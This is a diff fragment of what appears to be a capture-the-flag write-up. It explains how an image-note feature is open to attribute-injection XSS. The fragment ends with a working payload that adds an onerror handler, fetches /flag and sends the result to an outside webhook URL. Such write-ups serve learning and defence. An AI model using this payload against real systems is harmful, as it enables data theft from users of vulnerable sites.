@@ -102,7 +102,7 @@ According to the source, when we create an image note our payload is inserted in
 
 This is really easy to escape. You only need to put a double quote to complete the `src="` and then you can define your own `onerror` handler.
 
-I used ~\`~ (backtick) for my strings because JavaScript is cool like that. You could probably find a way to escape the strings using `\`.
+I used \` (backtick) for my strings because JavaScript is cool like that. You could probably find a way to escape the strings using `\`.
 
 ```
 x" onerror='fetch(`/flag`).then(resp => resp.text().then(s => fetch(`https://webhook.site/8d6fb386-328a-40e7-be2b-f124729267de/?flag=` + s)))' style="
